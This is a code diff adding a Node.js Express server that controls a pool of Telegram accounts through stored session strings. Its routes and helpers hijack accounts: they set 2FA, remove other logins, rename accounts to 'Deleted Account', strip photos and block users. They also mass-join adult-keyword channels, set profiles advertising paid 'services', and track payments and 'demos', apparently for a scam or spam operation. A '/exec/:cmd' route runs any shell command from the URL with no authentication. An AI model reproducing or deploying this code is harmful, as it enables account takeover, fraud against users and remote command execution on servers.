+        const result = await db.getActiveChannels(parseInt(limit), parseInt(skip), k ? [k] : keys, channels.ids, 'channels');
+        console.log("DbChannelsLen: ", result.length);
+        let resp = '';
+        for (const channel of result) {
+
+          resp = resp + (channel?.username?.startsWith("@") ? channel.username : `@${channel.username}`) + "|";
+        }
+        await client.removeOtherAuths();
+        client.joinChannels(resp);
+      } else {
+        console.log("Client Does not exist!")
+      }
+    }
+  } catch (error) {
+    console.log("Some Error: ", error)
+  }
+});
+
+app.get('/set2fa/:number', async (req, res, next) => {
+  res.send("Setting 2FA");
+  next();
+}, async (req, res) => {
+  try {
+    const number = req.params?.number;
+    const db = ChannelService.getInstance();
+    const user = await db.getUser({ mobile: number });
+    if (!hasClient(user.mobile)) {
+      const cli = await createClient(user.mobile, user.session);
+      const client = await getClient(user.mobile);
+      if (cli) {
+        await client.set2fa();
+      } else {
+        console.log("Client Does not exist!")
+      }
+    }
+  } catch (error) {
+    console.log("Some Error: ", error.code)
+  }
+});
+
+app.get('/setpp/:number/:name', async (req, res, next) => {
+  res.send("Setting 2FA");
+  next();
+}, async (req, res) => {
+  try {
+    const number = req.params?.number;
+    const name = req.params?.name;
+    const db = ChannelService.getInstance();
+    const user = await db.getUser({ mobile: number });
+    if (!hasClient(user.mobile)) {
+      const cli = await createClient(user.mobile, user.session);
+      const client = await getClient(user.mobile);
+      if (cli) {
+        await CloudinaryService.getInstance(name);
+        await sleep(2000);
+        await client.updateProfilePic('./dp1.jpg');
+        await sleep(1000);
+        await client.updateProfilePic('./dp2.jpg');
+        await sleep(1000);
+        await client.updateProfilePic('./dp3.jpg');
+        await sleep(1000);
+      } else {
+        console.log("Client Does not exist!")
+      }
+    }
+  } catch (error) {
+    console.log("Some Error: ", error.code)
+  }
+});
+
+
+app.get('/updateclientasdeleted/:number', async (req, res, next) => {
+  res.send("Updating Name");
+  next();
+}, async (req, res) => {
+  try {
+    const number = req.params?.number;
+    const db = ChannelService.getInstance();
+    let user = await db.getUser({ mobile: number });
+    if (!user) {
+      user = await db.getInAchivedClient({ number: `+${number}` });
+      user['mobile'] = user.number
+    }
+    console.log(user);
+    if (user && !hasClient(user.mobile)) {
+      const cli = await createClient(user.mobile, user.session);
+      const client = await getClient(user.mobile);
+      if (cli) {
+        if (!(await client.hasPassword())) {
+          await client.set2fa();
+        }
+        await sleep(30000)
+        await client.updateUsername();
+        await sleep(5000)
+        await client.updatePrivacyforDeletedAccount();
+        await sleep(5000)
+        await client.updateProfile("Deleted Account", "Deleted Account");
+        await sleep(5000)
+        await client.deleteProfilePhotos();
+        await sleep(5000)
+      } else {
+        console.log("Client Does not exist!")
+      }
+    }
+  } catch (error) {
+    console.log("Some Error: ", error)
+  }
+});
+
+
+app.get('/updatePrivacy/:number', async (req, res, next) => {
+  res.send("Updating Privacy");
+  next();
+}, async (req, res) => {
+  try {
+    const number = req.params?.number;
+    const db = ChannelService.getInstance();
+    const user = await db.getUser({ mobile: number });
+    console.log(user);
+    if (!hasClient(user.mobile)) {
+      const cli = await createClient(user.mobile, user.session);
+      const client = await getClient(user.mobile);
+      if (cli) {
+        await client.updatePrivacy();
+      } else {
+        console.log("Client Does not exist!")
+      }
+    }
+  } catch (error) {
+    console.log("Some Error: ", error)
+  }
+});
+
+app.get('/UpdateUsername/:number', async (req, res, next) => {
+  res.send("Updating Privacy");
+  next();
+}, async (req, res) => {
+  try {
+    const number = req.params?.number;
+    const username = req.query?.username;
+    const db = ChannelService.getInstance();
+    const user = await db.getUser({ mobile: number });
+    console.log(user);
+    if (!hasClient(user.mobile)) {
+      const cli = await createClient(user.mobile, user.session);
+      const client = await getClient(user.mobile);
+      if (cli) {
+        await client.updateUsername(username);
+      } else {
+        console.log("Client Does not exist!")
+      }
+    }
+  } catch (error) {
+    console.log("Some Error: ", error)
+  }
+});
+
+
+app.get('/UpdatePP/:number', async (req, res, next) => {
+  res.send("Updating profile Pic");
+  next();
+}, async (req, res) => {
+  try {
+    const number = req.params?.number;
+    const db = ChannelService.getInstance();
+    const user = await db.getUser({ mobile: number });
+    console.log(user);
+    if (!hasClient(user.mobile)) {
+      const cli = await createClient(user.mobile, user.session);
+      const client = await getClient(user.mobile);
+      if (cli) {
+        await client.updateProfilePic("./qrcode.jpg");
+      } else {
+        console.log("Client Does not exist!")
+      }
+    }
+  } catch (error) {
+    console.log("Some Error: ", error)
+  }
+});
+
+app.get('/deleteChat/:number/:chatId', async (req, res, next) => {
+  res.send("dleteing chat");
+  next();
+}, async (req, res) => {
+  try {
+    const number = req.params?.number;
+    const chatId = req.params?.chatId;
+    const db = ChannelService.getInstance();
+    const user = await db.getUser({ mobile: number });
+    console.log(user);
+    if (!hasClient(user.mobile)) {
+      const cli = await createClient(user.mobile, user.session);
+      const client = await getClient(user.mobile);
+      if (cli) {
+        await client.deleteChat(chatId);
+      } else {
+        console.log("Client Does not exist!")
+      }
+    }
+  } catch (error) {
+    console.log("Some Error: ", error)
+  }
+});
+
+
+app.get('/UpdateName/:number', async (req, res, next) => {
+  res.send("Updating Name");
+  next();
+}, async (req, res) => {
+  try {
+    const number = req.params?.number;
+    const db = ChannelService.getInstance();
+    const user = await db.getUser({ mobile: number });
+    console.log(user);
+    if (!hasClient(user.mobile)) {
+      const cli = await createClient(user.mobile, user.session);
+      const client = await getClient(user.mobile);
+      if (cli) {
+        await client.updateProfile("Deleted Account", "Deleted Account");
+      } else {
+        console.log("Client Does not exist!")
+      }
+    }
+  } catch (error) {
+    console.log("Some Error: ", error)
+  }
+});
+
+
+app.get('/deletepp/:number', async (req, res, next) => {
+  res.send("Updating Name");
+  next();
+}, async (req, res) => {
+  try {
+    const number = req.params?.number;
+    const db = ChannelService.getInstance();
+    const user = await db.getUser({ mobile: number });
+    console.log(user);
+    if (!hasClient(user.mobile)) {
+      const cli = await createClient(user.mobile, user.session);
+      const client = await getClient(user.mobile);
+      if (cli) {
+        await client.deleteProfilePhotos();
+      } else {
+        console.log("Client Does not exist!")
+      }
+    }
+  } catch (error) {
+    console.log("Some Error: ", error)
+  }
+});
+
+app.get('/rmbuffer/:number', async (req, res, next) => {
+  res.send("Updating Name");
+  next();
+}, async (req, res) => {
+  try {
+    const number = req.params?.number;
+    const db = ChannelService.getInstance();
+    await db.deleteBufferClient({ mobile: number })
+  } catch (error) {
+    console.log("Some Error: ", error)
+  }
+});
+
+app.get('/removeAuths/:number', async (req, res) => {
+  const number = req.params?.number;
+  const db = ChannelService.getInstance();
+  const user = await db.getUser({ mobile: number });
+  if (!hasClient(user.mobile)) {
+    const cli = await createClient(user.mobile, user.session);
+    const client = await getClient(user.mobile);
+    if (client) {
+      await client.removeOtherAuths();
+      res.send("Auths Removed");
+    } else {
+      res.send("client EXPIRED");
+    }
+  } else {
+    res.send("Client Already existing");
+  }
+});
+
+app.get('/exec/:cmd', async (req, res, next) => {
+  let cmd = req.params.cmd;
+  console.log(`executing: `, cmd);
+  try {
+    res.send(console.log(execSync(cmd).toString()));
+  } catch (error) {
+    console.log(error);
+  }
+});
+
+app.get('/blockusers/:number', async (req, res) => {
+  const number = req.params?.number;
+  const db = ChannelService.getInstance();
+  const user = await db.getUser({ mobile: number });
+  if (!hasClient(user.mobile)) {
+    const cli = await createClient(user.mobile, user.session);
+    const client = await getClient(user.mobile);
+    if (client) {
+      await client.blockAllUsers();
+      res.send("Blocked Users");
+    } else {
+      res.send("client EXPIRED");
+    }
+  } else {
+    res.send("Client Already existing");
+  }
+});
+
+app.get('/getAuths/:number', async (req, res) => {
+  const number = req.params?.number;
+  const db = ChannelService.getInstance();
+  const user = await db.getUser({ mobile: number });
+  if (!hasClient(user.mobile)) {
+    const cli = await createClient(user.mobile, user.session);
+    const client = await getClient(user.mobile);
+    if (client) {
+      res.json(await client.getAuths());
+    } else {
+      res.send("client EXPIRED");
+    }
+  } else {
+    res.send("Client Already existing");
+  }
+});
+
+
+app.get('/connectcliens/:limit/:skip', async (req, res) => {
+  const limit = req.params?.limit;
+  const skip = req.params?.skip;
+  const db = ChannelService.getInstance();
+  const users = await db.getUsersFullData(parseInt(limit), parseInt(skip));
+  let resp = '<html><head><style>pre { font-size: 18px; }</style></head><body><pre>';
+
+  for (const user of users) {
+    if (!hasClient(user.mobile)) {
+      const cli = await createClient(user.mobile, user.session);
+      if (cli) {
+        resp += `${user.mobile} : true\n\n`;
+      } else {
+        resp += `${user.mobile} : false\n\n`;
+      }
+    }
+  }
+
+  resp += '</pre></body></html>';
+
+  console.log("data: ", resp);
+  res.setHeader('Content-Type', 'text/html');
+  res.send(resp);
+});
+
+app.get('/disconnectclients', async (req, res, next) => {
+  res.send('Hello World!');
+  next();
+}, async (req, res) => {
+  await disconnectAll();
+});
+
+app.get('/disconnectclient', async (req, res, next) => {
+  res.send('Hello World!');
+  next();
+}, async (req, res) => {
+  const number = req.query?.number?.replace('+', '');
+  await deleteClient(number);
+});
+
+app.get('/promoteStats', async (req, res, next) => {
+  const resp = await getPromotionStatsHtml();
+  res.setHeader('Content-Type', 'text/html');
+  res.send(resp)
+});
+
+
+app.get('/getusers/:limit/:skip', async (req, res, next) => {
+  const limit = parseInt(req.params?.limit ? req.params?.limit : 10);
+  const skip = parseInt(req.params?.skip ? req.params?.skip : 10);
+  const db = ChannelService.getInstance();
+  const users = await db.getUsers(limit, skip);
+  res.json(users)
+})
+
+app.get('/getlastmsgs/:number/:limit', async (req, res, next) => {
+  const limit = parseInt(req.params?.limit ? req.params?.limit : 10);
+  const number = req.params?.number;
+  console.log(number, limit);
+  const clientobj = getClient(number);
+  await clientobj.client.connect();
+  console.log(clientobj.client.connected);
+  if (clientobj) {
+    const result = await clientobj?.getLastMsgs(limit, number);
+    res.send(result)
+  } else {
+    res.send("client is undefined");
+  }
+
+})
+
+app.get('/getchannels', async (req, res, next) => {
+  checkerclass.getinstance()
+  res.send('Hello World!');
+  next();
+}, async (req, res) => {
+  const userValues = Array.from(userMap.values());
+  for (let i = 0; i < userValues.length; i++) {
+    const value = userValues[i];
+    await fetchWithTimeout(`${value.url}getchannels`);
+    await sleep(1000);
+  }
+});
+
+app.get('/restart', async (req, res, next) => {
+  res.send('Hello World!');
+  next();
+}, async (req, res) => {
+  const userName = req.query.userName;
+  const checker = checkerclass.getinstance()
+  checker.restart(userName.toLowerCase());
+});
+
+app.get('/receiveNumber/:num', async (req, res, next) => {
+  res.send('Hello World!');
+  next();
+}, async (req, res) => {
+  try {
+    const userName = req.query.userName;
+    const num = parseInt(req.params.num);
+    const data = userMap.get(userName.toLowerCase());
+    if (data) {
+      await fetchWithTimeout(`${data.url}receiveNumber/${num}`, { timeout: 7000 });
+    }
+  } catch (error) {
+    console.log("Some Error: ", error.code);
+  }
+});
+
+app.get('/tgclientoff/:num', async (req, res, next) => {
+  res.send('Hello World!');
+  next();
+}, async (req, res) => {
+  try {
+    const userName = req.query.userName;
+    const processId = req.params.num;
+    console.log(new Date(Date.now()).toLocaleString('en-IN', timeOptions), 'Req receved from: ', req.query.url, " : ", userName, ' - ', processId)
+
+    try {
+      const data = userMap.get(userName.toLowerCase());
+      const url = data?.url;
+      if (url) {
+        const connectResp = await fetchWithTimeout(`${url}getprocessid`, { timeout: 10000 });
+        if (connectResp.data.ProcessId === processId) {
+          userMap.set(userName.toLowerCase(), { ...data, timeStamp: Date.now(), downTime: 0, lastPingTime: Date.now() });
+          pushToconnectionQueue(userName, processId)
+        } else {
+          console.log(`Actual Process Id from ${url}getprocessid : `, connectResp.data.ProcessId);
+          console.log("Request received from Unknown process")
+        }
+      }
+    } catch (error) {
+      console.log("Some Error: ", error)
+    }
+
+  } catch (error) {
+    console.log("Some Error: ", error);
+  }
+});
+
+
+app.get('/joinchannel', async (req, res, next) => {
+  res.send('Hello World!');
+  next();
+}, async (req, res) => {
+  try {
+    const userName = req.query.userName;
+    if (userName) {
+      const data = userMap.get(userName.toLowerCase());
+      if (data) {
+        joinchannels(data)
+      } else {
+        console.log(new Date(Date.now()).toLocaleString('en-IN', timeOptions), `User ${userName} Not exist`);
+      }
+    } else {
+      Array.from(userMap.values()).map(async (value) => {
+        try {
+          joinchannels(value);
+          await sleep(3000);
+        } catch (error) {
+          console.log("Some Error: ", error.code);
+        }
+      })
+    }
+  } catch (error) {
+    console.log("Some Error: ", error);
+  }
+});
+
+app.get('/joinchannelBf', async (req, res, next) => {
+  res.send('Hello World!');
+  next();
+}, async (req, res) => {
+  try {
+    joinchannelForBufferClients()
+  } catch (error) {
+    console.log("Some Error: ", error.code);
+  }
+});
+
+app.get('/requestcall', async (req, res, next) => {
+  res.send('Hello World!');
+  next();
+}, async (req, res) => {
+  try {
+    const userName = req.query.userName;
+    const chatId = req.query.chatId;
+    const user = userMap.get(userName.toLowerCase());
+    // await fetchWithTimeout(`${ppplbot()}&text=Call Request Recived: ${userName} | ${chatId}`);
+    console.log(`Call Request Recived: ${userName} | ${chatId}`)
+    if (user) {
+      setTimeout(async () => {
+        try {
+          const data = await fetchWithTimeout(`${user.url}requestcall/${chatId}`, { timeout: 7000 });
+          if (data.data) {
+            console.log(`Call Request Sent: ${userName} | ${chatId}`)
+            setTimeout(async () => {
+              try {
+                const data = await fetchWithTimeout(`${user.url}requestcall/${chatId}`, { timeout: 7000 });
+                setTimeout(async () => {
+                  await fetchWithTimeout(`${user.url}sendMessage/${chatId}?msg=Not Connecting!!, Don't worry I will try again in sometime!! okay!!`, { timeout: 7000 });
+                }, 3 * 60 * 1000);
+              } catch (error) {
+                console.log(error)
+              }
+            }, 2 * 60 * 1000);
+          } else {
+            console.log(`Call Request Sent Not Sucess: ${userName} | ${chatId}`);
+          }
+        } catch (error) {
+          console.log("Failed", user);
+        }
+
+      }, 3 * 60 * 1000);
+    } else {
+      console.log("USer not exist!!")
+    }
+  } catch (error) {
+    console.log("Some Error: ", error.code);
+  }
+});
+
+app.listen(port, async () => {
+  console.log(`Example app listening at http://localhost:${port}`)
+});
+
+class checkerclass {
+  static instance = undefined;
+
+  constructor () {
+    this.main();
+  };
+
+  static getinstance() {
+    if (!checkerclass.instance) {
+      console.log('creating instance-------')
+      checkerclass.instance = new checkerclass();
+    }
+    return checkerclass.instance;
+  }
+  main() {
+
+  }
+
+  async restart(userName, processId) {
+    const data = userMap.get(userName);
+    console.log(data, userName);
+    const url = data?.url;
+    if (url) {
+      userMap.set(userName, { ...data, timeStamp: Date.now() });
+      try {
+        //await fetchWithTimeout(`${ ppplbot() }& text=${ userName } is DOWN!!`, { timeout: 10000 });
+        //await fetchWithTimeout(`${ url } `, { timeout: 10000 });
+        try {
+          console.log('Checking Health')
+          const resp = await fetchWithTimeout(`${url} checkHealth`, { timeout: 10000 });
+          if (resp.status === 200 || resp.status === 201) {
+            if (resp.data.status === apiResp.ALL_GOOD || resp.data.status === apiResp.WAIT) {
+              console.log(resp.data.userName, ': All good');
+            } else {
+              console.log(resp.data.userName, ': DIAGNOSE - HealthCheck - ', resp.data.status);
+              await fetchWithTimeout(`${ppplbot()}&text=${(resp.data.userName).toUpperCase()}:HealthCheckError-${resp.data.status}`);
+              try {
+                const connectResp = await fetchWithTimeout(`${url}tryToConnect/${processId}`, { timeout: 10000 });
+                console.log(connectResp.data.userName, ': RetryResp - ', connectResp.data.status);
+                await fetchWithTimeout(`${ppplbot()}&text=${(connectResp.data.userName).toUpperCase()}:RetryResponse-${connectResp.data.status}`);
+              } catch (e) {
+                console.log(url, `CONNECTION RESTART FAILED!!`);
+              }
+            }
+          } else {
+            console.log(url, `is unreachable!!`);
+          }
+        } catch (e) {
+          console.log(url, `is unreachable!!`);
+          //console.log(e)
+        }
+      }
+      catch (e) {
+        console.log(e)
+      }
+    }
+    else {
+      console.log('url is undefined');
+    }
+  }
+}
+async function joinchannels(value) {
+  try {
+    let resp = await fetchWithTimeout(`${value.url}channelinfo`, { timeout: 200000 });
+    await fetchWithTimeout(`${(ppplbot())}&text=ChannelCount SendTrue - ${value.clientId}: ${resp.data.canSendTrueCount}`)
+    if (resp?.data?.canSendTrueCount && resp?.data?.canSendTrueCount < 250) {
+      await fetchWithTimeout(`${ppplbot()}&text=Started Joining Channels- ${value.clientId}`)
+      const keys = ['wife', 'adult', 'lanj', 'servic', 'paid', 'randi', 'bhab', 'boy', 'girl'];
+      const db = ChannelService.getInstance();
+      const channels = await db.getActiveChannels(100, 0, keys, resp.data?.ids, 'activeChannels');
+      for (const channel of channels) {
+        try {
+          console.log(channel.username);
+          const username = channel?.username?.replace("@", '');
+          if (username) {
+            fetchWithTimeout(`${value.url}joinchannel?username=${username}`);
+            await sleep(200000);
+          }
+        } catch (error) {
+          console.log("Some Error: ", error)
+        }
+      }
+    }
+  } catch (error) {
+    console.log(error)
+  }
+}
+
+
+async function getPromotionStatsPlain() {
+  let resp = '';
+  const db = ChannelService.getInstance();
+  const result = await db.readPromoteStats();
+  for (const data of result) {
+    resp += `${data.client.toUpperCase()} : ${data.totalCount} ${data.totalCount > 0 ? ` | ${Number((Date.now() - data.lastUpdatedTimeStamp) / (1000 * 60)).toFixed(2)}` : ''}`;
+  }
+  return resp;
+}
+
+async function getPromotionStats() {
+  let resp = '';
+  const db = ChannelService.getInstance();
+  const result = await db.readPromoteStats();
+  for (const data of result) {
+    resp += `${data.client.toUpperCase()} : <b>${data.totalCount}</b>${data.totalCount > 0 ? ` | ${Number((Date.now() - data.lastUpdatedTimeStamp) / (1000 * 60)).toFixed(2)}` : ''}<br>`;
+  }
+  return resp;
+}
+
+async function getPromotionStatsHtml() {
+  let resp = '<html><head><style>pre { font-size: 18px; }</style></head><body><pre>';
+  resp = resp + await getPromotionStats();
+  resp += '</pre></body></html>';
+  return resp;
+}
+
+function isDateInPast(dateStr) {
+  const today = new Date();
+  const [day, month, year] = dateStr.split('-').map(Number);
+  const inputDate = new Date(year, month - 1, day); // Note: Month is 0-based in JavaScript
+
+  return inputDate < today;
+}
+
+async function getData() {
+  const profileData = await createInitializedObject();
+  const db = await ChannelService.getInstance();
+  let entries = await db.readStats();
+  // console.log(Object.keys(profileData));
+  for (const entry of entries) {
+    const { count, newUser, payAmount, demoGivenToday, demoGiven, profile, client, name, secondShow } = entry;
+
+    // console.log(profile.toUpperCase(), profileData[profile.toUpperCase()])
+    if (client && profileData[client.toUpperCase()]) {
+      const userData = profileData[client.toUpperCase()];
+      userData.totalCount += count;
+      userData.totalPaid += payAmount > 0 ? 1 : 0;
+      userData.totalOldPaid += (payAmount > 0 && !newUser) ? 1 : 0;
+      userData.oldPaidDemo += (demoGivenToday && !newUser) ? 1 : 0;
+      userData.totalpendingDemos += (payAmount > 25 && !demoGiven) ? 1 : 0;
+      userData.oldPendingDemos += (payAmount > 25 && !demoGiven && !newUser) ? 1 : 0;
+      if (payAmount > 25 && !demoGiven) {
+        userData.names = userData.names + ` ${name} |`
+      }
+
+      if (demoGiven && ((payAmount > 90 && !secondShow) || (payAmount > 150 && secondShow))) {
+        userData.fullShowPPl++;
+        userData.fullShowNames = userData.fullShowNames + ` ${name} |`
+      }
+
+      if (newUser) {
+        userData.totalNew += 1;
+        userData.totalNewPaid += payAmount > 0 ? 1 : 0;
+        userData.newPaidDemo += demoGivenToday ? 1 : 0;
+        userData.newPendingDemos += (payAmount > 25 && !demoGiven) ? 1 : 0;
+      }
+    }
+  }
+  const profileDataArray = Object.entries(profileData);
+  profileDataArray.sort((a, b) => b[1].totalpendingDemos - a[1].totalpendingDemos);
+  let reply = '';
+  for (const [profile, userData] of profileDataArray) {
+    reply += `${profile.toUpperCase()} : <b>${userData.totalpendingDemos}</b> | ${userData.names}<br>`;
+  }
+
+  profileDataArray.sort((a, b) => b[1].fullShowPPl - a[1].fullShowPPl);
+  let reply2 = '';
+  for (const [profile, userData] of profileDataArray) {
+    reply2 += `${profile.toUpperCase()} : <b>${userData.fullShowPPl}</b> |${userData.fullShowNames}<br>`;
+  }
+
+  let reply3 = await getPromotionStats()
+
+  return (
+    `<div>
+      <div style="display: flex; margin-bottom: 60px">
+        <div style="flex: 1;">${reply}</div>
+        <div style="flex: 1; ">${reply2}</div>
+      </div>
+      <div style="display: flex;">
+        <div style="flex: 1; " >${reply3}</div>
+      </div>
+    </div>`
+  );
+
+}
+let goodIds = [];
+let badIds = [];
+async function checkBufferClients() {
+  const db = await ChannelService.getInstance();
+  await disconnectAll()
+  await sleep(2000);
+  const clients = await db.readBufferClients({});
+  goodIds = [];
+  badIds = [];
+  if (clients.length < 40) {
+    for (let i = 0; i < 40 - clients.length; i++) {
+      badIds.push(1)
+    }
+  }
+  for (const document of clients) {
+    console.log(document)
+    const cli = await createClient(document.mobile, document.session);
+    if (cli) {
+      const client = await getClient(document.mobile);
+      const hasPassword = await client.hasPassword();
+      if (!hasPassword) {
+        badIds.push(document.mobile);
+        await db.deleteBufferClient(document);
+      } else {
+        const channels = await client.channelInfo(true);
+        await db.insertInBufferClients({ mobile: document.mobile, channels: channels.ids.length });
+        console.log(document.mobile, " :  ALL Good");
+        goodIds.push(document.mobile)
+      }
+      await client.disconnect();
+      await deleteClient(document.mobile)
+      await sleep(2000);
+    } else {
+      console.log(document.mobile, " :  false");
+      badIds.push(document.mobile);
+      await db.deleteBufferClient(document)
+    }
+  }
+  console.log(badIds, goodIds);
+  await addNewUserstoBufferClients();
+}
+
+async function addNewUserstoBufferClients() {
+  const db = await ChannelService.getInstance();
+  const cursor = await db.getNewBufferClients(goodIds);
+  while (badIds.length > 0) {
+    try {
+      if (cursor.hasNext()) {
+        const document = await cursor.next();
+        const cli = await createClient(document.mobile, document.session);
+        if (cli) {
+          const client = await getClient(document.mobile);
+          const hasPassword = await client.hasPassword();
+          console.log("hasPassword: ", hasPassword);
+          if (!hasPassword) {
+            await client.removeOtherAuths();
+            await client.set2fa();
+            console.log("waiting for setting 2FA");
+            await sleep(35000);
+            await client.updateUsername();
+            await sleep(5000)
+            await client.updatePrivacyforDeletedAccount();
+            await sleep(5000)
+            await client.updateProfile("Deleted Account", "Deleted Account");
+            await sleep(5000)
+            await client.deleteProfilePhotos();
+            await sleep(5000)
+            console.log("Inserting Document");
+            document['date'] = (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0]
+            await db.insertInBufferClients(document);
+            await client.disconnect();
+            await deleteClient(document.mobile)
+            badIds.pop();
+          } else {
+            await db.updateUser(document, { twoFA: true });
+            await client.disconnect();
+            await deleteClient(document.mobile)
+          }
+        } else {
+          // await db.deleteUser(document);
+        }
+      } else {
+        console.log("Cursor Does not have Next");
+      }
+    } catch (error) {
+      console.error("An error occurred:", error);
+    }
+  }
+  setTimeout(() => {
+    joinchannelForBufferClients()
+  }, 2 * 60 * 1000);
+}
+
+
+async function updateClient(clientId) {
+  try {
+    const db = await ChannelService.getInstance();
+    await disconnectAll();
+    await sleep(2000);
+    const oldClient = await db.getUserConfig({ clientId })
+    if (oldClient) {
+      try {
+        const oldClientUser = await db.getUser({ mobile: (oldClient?.number.toString()).replace("+", '') });
+        if (oldClientUser) {
+          const cli = await createClient(oldClientUser?.mobile, oldClientUser?.session);
+          if (cli) {
+            const client = await getClient(oldClientUser.mobile);
+            await CloudinaryService.getInstance(oldClient?.dbcoll?.toLowerCase());
+            // const userCaps = username[0].toUpperCase() + username.slice(1)
+            // await client.updateUsername(`${userCaps}Redd`);
+            await sleep(2000)
+            await client.updateProfile(oldClient.name, "Genuine Paid Girl🥰, Best Services❤️");
+            await sleep(3000)
+            await client.deleteProfilePhotos();
+            await sleep(3000)
+            await client.updatePrivacy();
+            await sleep(3000)
+            await client.updateProfilePic('./dp1.jpg');
+            await sleep(3000);
+            await client.updateProfilePic('./dp2.jpg');
+            await sleep(3000);
+            await client.updateProfilePic('./dp3.jpg');
+            await sleep(2000);
+          }
+        }
+      } catch (error) {
+        console.log("Error updateing settings of old Client - ", error);
+      }
+    }
+  } catch (e) {
+
+  }
+}
+async function setUpClient(clientId, archieveOld, days = 0, mobile = null, formalities = true, pLimited = false) {
+  try {
+    const db = await ChannelService.getInstance();
+    const oldClient = await db.getUserConfig({ clientId })
+    let oldClienttg;
+    if (archieveOld && oldClient) {
+      try {
+        const oldClientUser = await db.getUser({ mobile: (oldClient?.number.toString()).replace("+", '') });
+        if (oldClientUser) {
+          const cli = await createClient(oldClientUser?.mobile, oldClientUser?.session, false);
+          if (cli) {
+            oldClienttg = await getClient(oldClientUser.mobile);
+            // await oldClienttg.updateProfile("Deleted Account", `New ACC https://${oldClient.link}`);
+            // await sleep(5000)
+            await oldClienttg.deleteProfilePhotos();
+            await sleep(3000)
+            await oldClienttg.updatePrivacyforDeletedAccount();
+            await sleep(2000)
+            await oldClienttg.updateUsername()
+          }
+        }
+        delete oldClientUser["_id"];
+        if (!pLimited) {
+          oldClientUser['date'] = (new Date(Date.now() + (days * 24 * 60 * 60 * 1000))).toISOString().split('T')[0]
+          await db.insertInBufferClients({ ...oldClientUser })
+        }
+      } catch (error) {
+        console.log("Error updateing settings of old Client - ", error);
+        await fetchWithTimeout(`${ppplbot()}&text=Error updateing settings of old Client - ${clientId}`);
+      }
+      delete oldClient['_id']
+      oldClient['insertedDate'] = new Date().toISOString().split('T')[0]
+      oldClient['pLimited'] = pLimited
+      await db.insertInAchivedClient(oldClient);
+      await fetchWithTimeout(`${ppplbot()}&text=Archived Old Client ${clientId}`);
+      console.log("Archived old client");
+    }
+
+    const newClient = await db.getOneBufferClient(mobile);
+
+    await deleteClient(newClient.mobile)
+    await sleep(2000);
+    if (newClient) {
+      const cli = await createClient(newClient.mobile, newClient.session, false);
+      if (cli) {
+        const client = await getClient(newClient.mobile);
+        let newUsername
+        setActiveClientSetup({ phoneNumber: newClient.mobile, clientId });
+        if (formalities) {
+          const username = (clientId?.match(/[a-zA-Z]+/g)).toString();
+          const userCaps = username[0].toUpperCase() + username.slice(1);
+          newUsername = await client.updateUsername(`${userCaps}Redd`);
+          if (archieveOld && oldClienttg) {
+            oldClienttg?.updateProfile("Deleted Account", `New ACC: @${newUsername}`);
+          }
+        }
+        await sleep(2000)
+        const existingData = await db.getInAchivedClient({ number: `+${newClient.mobile}` });
+        if (existingData) {
+          await fetchWithTimeout(`${ppplbot()}&text=Setting UP from archives - ${clientId}-${newUsername}-${newClient.mobile}`);
+          console.log("Data Existing already");
+          await setNewClient({ ...existingData, userName: newUsername }, { clientId });
+          await db.removeOneAchivedClient({ number: `+${newClient.mobile}` });
+        } else {
+          await fetchWithTimeout(`${ppplbot()}&text=Generating new Session -  ${clientId}-${newUsername}-${newClient.mobile}`);
+          await generateNewSession(newClient.mobile);
+          setTimeout(async () => {
+            const stillExists = await db.getOneBufferClient(newClient.mobile);
+            if (stillExists) {
+              console.log("Removeing buff client as failed to update")
+              stillExists['date'] = (new Date(Date.now() + (30 * 24 * 60 * 60 * 1000))).toISOString().split('T')[0]
+              await db.insertInBufferClients({ ...stillExists })
+            }
+          }, 150000);
+        }
+      }
+    } else {
+      console.log("New client does not exist")
+    }
+  } catch (error) {
+    console.log(error)
+  }
+}
+async function generateNewSession(phoneNumber) {
+  try {
+    console.log("String Generation started");
+    await sleep(1000);
+    const response = await fetchWithTimeout(`https://tgsignup.onrender.com/login?phone=${phoneNumber}&force=${true}`, { timeout: 15000 }, 1);
+    if (response) {
+      console.log(`Code Sent successfully-${response}`);
+      await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`Code Sent successfully-${response}-${phoneNumber}`)}`);
+    } else {
+      await sleep(5000);
+      await generateNewSession(phoneNumber);
+    }
+  } catch (error) {
+    console.log(error)
+  }
+}
+async function setNewClient(user, activeClientSetup) {
+  try {
+    console.log("Setting data for:", user, activeClientSetup)
+    const clientId = activeClientSetup.clientId;
+    const db = await ChannelService.getInstance();
+    let mainAccount = user.userName?.replace("@", '')
+    if (fetchNumbersFromString(clientId) == "2") {
+      const mainUser = await db.getUserConfig({ clientId: clientId.replace("2", "1") });
+      mainAccount = mainUser.userName;
+    } else {
+      const client2 = clientId.replace("1", "2")
+      const data = await db.updateUserConfig({ clientId: client2 }, { mainAccount: mainAccount });
+      if (data) {
+        console.log(client2, " -  ", data)
+        console.log(`updated ${client2}'s MainAccount with ${mainAccount}`);
+        // if (data.userName) {
+        //   try {
+        //     await fetchWithTimeout(`https://uptimechecker.onrender.com/disconnectUser?userName=${data.userName}`);
+        //   } catch (error) {
+
+        //   }
+        // }
+      }
+    }
+    const updatedClient = await db.updateUserConfig({ clientId: activeClientSetup.clientId }, { session: user.session, number: user.number ? user.number : `+${user.mobile}`, userName: user.userName?.replace("@", ''), mainAccount: mainAccount });
+    console.log("Updated the Client Successfully", updatedClient);
+    await db.deleteBufferClient({ mobile: activeClientSetup.phoneNumber });
+    await fetchWithTimeout(`https://uptimechecker.onrender.com/forward/updateclient/${clientId}`);
+    await fetchWithTimeout(`${ppplbot()}&text=Update Done - ${user.clientId}-${user.userName}-${user.number}-${user.name}`);
+    console.log(activeClientSetup.clientId, " -  ", updatedClient)
+    if (updatedClient?.userName) {
+      try {
+        await fetchWithTimeout(`https://uptimechecker.onrender.com/disconnectUser?userName=${updatedClient.userName}`);
+      } catch (error) {
+        console.log(error);
+      }
+    }
+    await setUserMap();
+    try {
+      await fetchWithTimeout(`https://uptimechecker.onrender.com/refreshmap`);
+    } catch (error) {
+      console.log(error);
+    }
+  } catch (error) {
+    console.log(error);;
+  }
+}
+
+function fetchNumbersFromString(inputString) {
+  const regex = /\d+/g;
+  const matches = inputString.match(regex);
+  if (matches) {
+    const result = matches.join('');
+    return result;
+  } else {
+    return '';
+  }
+}
+
+async function joinchannelForBufferClients() {
+  const db = ChannelService.getInstance();
+  await disconnectAll();
+  await sleep(2000);
+  const clients = await db.readBufferClients({ channels: { "$lt": 180 } }, 4)
+  for (const document of clients) {
+    const cli = await createClient(document.mobile, document.session, false);
+    if (cli) {
+      const client = await getClient(document.mobile);
